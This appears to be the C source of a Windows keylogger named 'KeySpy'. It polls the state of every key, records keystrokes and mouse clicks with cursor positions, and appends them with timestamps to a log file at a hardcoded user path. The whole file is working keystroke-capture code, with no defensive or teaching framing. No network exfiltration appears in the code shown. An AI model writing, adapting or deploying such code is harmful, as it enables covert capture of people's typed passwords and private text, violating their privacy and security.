#include "KeySpy.h"

//====================================================================================================

char mFilePath[MAX_STRING_SIZE];
char mBuffer[MAX_BUFFER_SIZE][MAX_STRING_SIZE];
int  mBufferSize;
bool mKeys[KEYS_NUMBER];
HWND mWindow;

//====================================================================================================

void writeKeysToFile();
void getPressedKeys(char* str);
void addMousePosition(char* str);
void convertCodeToString(char* str, int keyCode);

//====================================================================================================

void generateFilePath(char* path)
{
    char username[MAX_TEMP_SIZE];
    //unsigned long len = sizeof(username);
    //GetUserName(username, &len);
    strcpy(username, "dt959");
    sprintf(path, "C:\\Users\\%s\\losu_%s.log", username, username);
}

//====================================================================================================

bool beginSession(const char* path)
{
    FILE* file = fopen(path, "at");
    if (!file)
        return false;
    SYSTEMTIME time;
    GetLocalTime(&time);
    fprintf(file, "=================================\n%02d.%02d.%04d %02d:%02d - BEGIN\n\n", time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute);
    fclose(file);
    strcpy(mFilePath, path);
    memset(mKeys, 0, sizeof(mKeys));
    mBufferSize = 0;
    return true;
}

//====================================================================================================

bool isSessionContinue()
{
    MSG msg;
    while (PeekMessage(&msg, mWindow, 0, 0, PM_REMOVE))
        switch (msg.message)
        {
        case WM_QUERYENDSESSION:
        case WM_ENDSESSION:
        case WM_QUIT:
            return false;
        default:
            break;
        }
    return true;
}

//====================================================================================================

bool wasStatusKeysUpdate()
{
    bool state, flag(false);
    for (int i = 1; i < KEYS_NUMBER; ++i)
    {
        state = (bool)GetAsyncKeyState(i);
        flag |= state != mKeys[i];
        mKeys[i] = state;
    }
    return flag;
}

//====================================================================================================

void rememberPressedKeys()
{
    getPressedKeys(mBuffer[mBufferSize]);
    if (strcmp(mBuffer[mBufferSize], "") != 0)
        ++mBufferSize;
    if (mBufferSize == MAX_BUFFER_SIZE)
        writeKeysToFile();
}

//====================================================================================================

void endSession()
{
    writeKeysToFile();
    FILE* file = fopen(mFilePath, "at");
    if (!file)
        return;
    SYSTEMTIME time;
    GetLocalTime(&time);
    fprintf(file, "\n%02d.%02d.%04d %02d:%02d - END\n=================================\n\n", time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute);
    fclose(file);
}

//====================================================================================================

void writeKeysToFile()
{
    FILE* file = fopen(mFilePath, "at");
    if (!file)
        return;
    for (int i = 0; i < mBufferSize; ++i)
        fprintf(file, "%s\n", mBuffer[i]);
    fclose(file);
    mBufferSize = 0;
}

//====================================================================================================

void getPressedKeys(char* str)
{
    str[0] = '\0';
    char key[MAX_KEY_SIZE];
    int cnt = MAX_STRING_SIZE / MAX_KEY_SIZE;
    for (int i = 0; i < KEYS_NUMBER; ++i)
        if (mKeys[i] && cnt > 0)
        {
            convertCodeToString(key, i);
            strcat(str, key);
            --cnt;
        }
}

//====================================================================================================

void addMousePosition(char* str)
{
    char tmp[MAX_TEMP_SIZE];
    POINT point;
    GetCursorPos(&point);
    sprintf(tmp, "{%ld; %ld} ", point.x, point.y);
    strcat(str, tmp);
}

//====================================================================================================

void convertCodeToString(char* keyBuf, int keyCode)
{
    switch (keyCode)
    {
    case KEY_MOUSE_LEFT:
        strcpy(keyBuf, "MOUSE_LEFT ");
        addMousePosition(keyBuf);
        break;
    case KEY_MOUSE_RIGHT:
        strcpy(keyBuf, "MOUSE_RIGHT ");
        addMousePosition(keyBuf);
        break;
    case KEY_CANCEL:
        strcpy(keyBuf, "CANCEL ");
        break;
    case KEY_MOUSE_MEDIUM:
        strcpy(keyBuf, "MOUSE_MEDIUM ");
        addMousePosition(keyBuf);
        break;
    case KEY_ESCAPE:
        strcpy(keyBuf, "ESCAPE ");
        PostMessage(mWindow, WM_QUERYENDSESSION, 0, 0);
        break;
    case KEY_BACKSPACE:
        strcpy(keyBuf, "BACKSPACE ");
        break;
    case KEY_TAB:
        strcpy(keyBuf, "TAB ");
        break;
    case KEY_ENTER:
        strcpy(keyBuf, "ENTER ");
        break;
    case KEY_SPACE:
        strcpy(keyBuf, "SPACE ");
        break;
    case KEY_SHIFT:
    case KEY_CTRL:
    case KEY_ALT:
        strcpy(keyBuf, "");
        break;
    case KEY_LEFT_WIN:
    case KEY_RIGHT_WIN:
        strcpy(keyBuf, "WIN ");
        break;
    case KEY_APPS:
        strcpy(keyBuf, "APPS ");
        break;
    case KEY_PAUSE:
        strcpy(keyBuf, "PAUSE ");
        break;
    case KEY_CAPS_LOCK:
        strcpy(keyBuf, "CAPS_LOCK ");
        break;
    case KEY_NUM_LOCK:
        strcpy(keyBuf, "NUM_LOCK ");
        break;
    case KEY_SCROLL_LOCK:
        strcpy(keyBuf, "SCROLL_LOCK ");
        break;
    case KEY_PG_UP:
        strcpy(keyBuf, "PG_UP ");
        break;
    case KEY_PG_DOWN:
        strcpy(keyBuf, "PG_DOWN ");
        break;
    case KEY_HOME:
        strcpy(keyBuf, "HOME ");
        break;
    case KEY_END:
        strcpy(keyBuf, "END ");
        break;
    case KEY_INSERT:
        strcpy(keyBuf, "INSERT ");
        break;
    case KEY_DELETE:
        strcpy(keyBuf, "DELETE ");
        break;
    case KEY_LEFT:
        strcpy(keyBuf, "LEFT ");
        break;
    case KEY_UP:
        strcpy(keyBuf, "UP ");
        break;
    case KEY_RIGHT:
        strcpy(keyBuf, "RIGHT ");
        break;
    case KEY_DOWN:
        strcpy(keyBuf, "DOWN ");
        break;
    case KEY_PRINT_SCREEN:
        strcpy(keyBuf, "PRINT_SCREEN ");
        break;
    case KEY_0:
        strcpy(keyBuf, "0 ");
        break;
    case KEY_1:
        strcpy(keyBuf, "1 ");
        break;
    case KEY_2:
        strcpy(keyBuf, "2 ");
        break;
    case KEY_3:
        strcpy(keyBuf, "3 ");
        break;
    case KEY_4:
        strcpy(keyBuf, "4 ");
        break;
    case KEY_5:
        strcpy(keyBuf, "5 ");
        break;
    case KEY_6:
        strcpy(keyBuf, "6 ");
        break;
    case KEY_7:
        strcpy(keyBuf, "7 ");
        break;
    case KEY_8:
        strcpy(keyBuf, "8 ");
        break;
    case KEY_9:
        strcpy(keyBuf, "9 ");
        break;
    case KEY_A:
        strcpy(keyBuf, "A ");
        break;
    case KEY_B:
        strcpy(keyBuf, "B ");
        break;
    case KEY_C:
        strcpy(keyBuf, "C ");
        break;
    case KEY_D:
        strcpy(keyBuf, "D ");
        break;
    case KEY_E:
        strcpy(keyBuf, "E ");
        break;
    case KEY_F:
        strcpy(keyBuf, "F ");
        break;
    case KEY_G:
        strcpy(keyBuf, "G ");
        break;
    case KEY_H:
        strcpy(keyBuf, "H ");
        break;
    case KEY_I:
        strcpy(keyBuf, "I ");
        break;
    case KEY_J:
        strcpy(keyBuf, "J ");
        break;
    case KEY_K:
        strcpy(keyBuf, "K ");
        break;
    case KEY_L:
        strcpy(keyBuf, "L ");
        break;
    case KEY_M:
        strcpy(keyBuf, "M ");
        break;
    case KEY_N:
        strcpy(keyBuf, "N ");
        break;
    case KEY_O:
        strcpy(keyBuf, "O ");
        break;
    case KEY_P:
        strcpy(keyBuf, "P ");
        break;
    case KEY_Q:
        strcpy(keyBuf, "Q ");
        break;
    case KEY_R:
        strcpy(keyBuf, "R ");
        break;
    case KEY_S:
        strcpy(keyBuf, "S ");
        break;
    case KEY_T:
        strcpy(keyBuf, "T ");
        break;
    case KEY_U:
        strcpy(keyBuf, "U ");
        break;
    case KEY_V:
        strcpy(keyBuf, "V ");
        break;
    case KEY_W:
        strcpy(keyBuf, "W ");
        break;
    case KEY_X:
        strcpy(keyBuf, "X ");
        break;
    case KEY_Y:
        strcpy(keyBuf, "Y ");
        break;
    case KEY_Z:
        strcpy(keyBuf, "Z ");
        break;
    case KEY_LEFT_SHIFT:
    case KEY_RIGHT_SHIFT:
        strcpy(keyBuf, "SHIFT ");
        break;
    case KEY_LEFT_CTRL:
    case KEY_RIGHT_CTRL:
        strcpy(keyBuf, "CTRL ");
        break;
    case KEY_LEFT_ALT:
    case KEY_RIGHT_ALT:
        strcpy(keyBuf, "ALT ");
        break;
    case KEY_GRAVE:
        strcpy(keyBuf, "` ");
        break;
    case KEY_MINUS:
        strcpy(keyBuf, "- ");
        break;
    case KEY_EQUALS:
        strcpy(keyBuf, "= ");
        break;
    case KEY_BACK_SLASH:
        strcpy(keyBuf, "\\ ");
        break;
    case KEY_LEFT_BRACKET:
        strcpy(keyBuf, "[ ");
        break;
    case KEY_RIGHT_BRACKET:
        strcpy(keyBuf, "] ");
        break;
    case KEY_SEMICOLON:
        strcpy(keyBuf, "; ");
        break;
    case KEY_APOSTROPHE:
        strcpy(keyBuf, "\' ");
        break;
    case KEY_COMMA:
        strcpy(keyBuf, ", ");
        break;
    case KEY_PERIOD:
        strcpy(keyBuf, ". ");
        break;
    case KEY_SLASH:
        strcpy(keyBuf, "/ ");
        break;
    case KEY_NUMPAD_0:
        strcpy(keyBuf, "0 ");
        break;
    case KEY_NUMPAD_1:
        strcpy(keyBuf, "1 ");
        break;
    case KEY_NUMPAD_2:
        strcpy(keyBuf, "2 ");
        break;
    case KEY_NUMPAD_3:
        strcpy(keyBuf, "3 ");
        break;
    case KEY_NUMPAD_4:
        strcpy(keyBuf, "4 ");
        break;
    case KEY_NUMPAD_5:
        strcpy(keyBuf, "5 ");
        break;
    case KEY_NUMPAD_6:
        strcpy(keyBuf, "6 ");
        break;
    case KEY_NUMPAD_7:
        strcpy(keyBuf, "7 ");
        break;
    case KEY_NUMPAD_8:
        strcpy(keyBuf, "8 ");
        break;
    case KEY_NUMPAD_9:
        strcpy(keyBuf, "9 ");
        break;
    case KEY_MULTIPLY:
        strcpy(keyBuf, "* ");
        break;
    case KEY_DIVIDE:
        strcpy(keyBuf, "/ ");
        break;
    case KEY_ADD:
        strcpy(keyBuf, "+ ");
        break;
    case KEY_SUBTRACT:
        strcpy(keyBuf, "- ");
        break;
    case KEY_DECIMAL:
        strcpy(keyBuf, ". ");
        break;
    case KEY_F1:
        strcpy(keyBuf, "F1 ");
        break;
    case KEY_F2:
        strcpy(keyBuf, "F2 ");
        break;
    case KEY_F3:
        strcpy(keyBuf, "F3 ");
        break;
    case KEY_F4:
        strcpy(keyBuf, "F4 ");
        break;
    case KEY_F5:
        strcpy(keyBuf, "F5 ");
        break;
    case KEY_F6:
        strcpy(keyBuf, "F6 ");
        break;
    case KEY_F7:
        strcpy(keyBuf, "F7 ");
        break;
    case KEY_F8:
        strcpy(keyBuf, "F8 ");
        break;
    case KEY_F9:
        strcpy(keyBuf, "F9 ");
        break;
    case KEY_F10:
        strcpy(keyBuf, "F10 ");
        break;
    case KEY_F11:
        strcpy(keyBuf, "F11 ");
        break;
    case KEY_F12:
        strcpy(keyBuf, "F12 ");
        break;
    default:
        sprintf(keyBuf, "UNKNOWN-%d ", keyCode);
        break;
    }
}
